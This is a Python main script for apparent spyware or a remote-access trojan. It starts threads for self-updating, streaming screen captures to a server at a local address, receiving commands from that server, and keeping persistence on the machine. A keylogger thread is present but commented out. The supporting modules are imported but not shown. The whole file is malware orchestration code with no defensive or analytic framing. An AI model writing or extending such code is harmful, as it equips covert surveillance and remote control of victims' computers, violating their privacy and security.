import threading
from time import sleep
#import keylogger
import self_updater
import capture_screen
import get_commands_from_server
import persistancy
import server_upload

def read_config():
    pass

if __name__ == '__main__':
    print("HIHIHI")
    #read_config()
    uploader = server_upload.Server("http://127.0.0.1:5000")
    """
    keylogger_thread = threading.Thread(target=keylogger.keylogger, args=())
    keylogger_thread.start()
    """

    self_updater_thread = threading.Thread(target=self_updater.self_updater, args=())
    self_updater_thread.start()

    live_stream_screen_thread = threading.Thread(target=capture_screen.screen_capture, args=(uploader,))
    live_stream_screen_thread.start()

    listen_to_commands_from_server_thread = threading.Thread(target=get_commands_from_server.listen, args=())
    listen_to_commands_from_server_thread.start()

    persistancy_thread = threading.Thread(target=persistancy.persistancy, args=())
    persistancy_thread.start()

    #keylogger_thread.join()
    self_updater_thread.join()
    live_stream_screen_thread.join()
    listen_to_commands_from_server_thread.join()
    persistancy_thread.join()


    #while "queue is running":
    #    sleep(3600) #one hour

